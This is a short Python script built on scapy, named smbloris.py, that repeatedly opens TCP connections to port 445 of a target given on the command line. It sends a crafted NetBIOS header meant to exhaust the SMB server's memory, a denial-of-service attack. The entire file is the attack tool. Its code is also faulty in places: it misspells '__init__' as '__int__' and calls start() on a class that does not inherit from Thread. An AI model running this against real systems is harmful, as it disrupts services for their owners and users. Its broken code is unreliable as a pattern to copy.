#!/usr/bin/env python

from scapy.all import *
import sys

if len(sys.argv) != 2:
	print "Usage: smbloris.py <target>"
	sys.exit(1)

victim = sys.argv[1]

conf.L3socket
conf.L3socket=L3RawSocket
class smbloris():
	try:
		def __int__(self):
			threading.Thread.__init__(self)

			
		def run(self):
			i = IP()
			i.dst = victim

			t = TCP()
			t.dport = 445
			t.sport = random.randint(1,65535)
			t.flags = "S"

			r = sr1(i/t)
			rt = r[TCP]
			t.ack = rt.seq + 1
			t.seq = rt.ack
			t.flags = "A"

			sbss = '\x00\x01\xff\xff'

			send(i/t/sbss)
	except KeyboardInterrupt:
		sys.exit(1)

while True:
	smbloris().start()
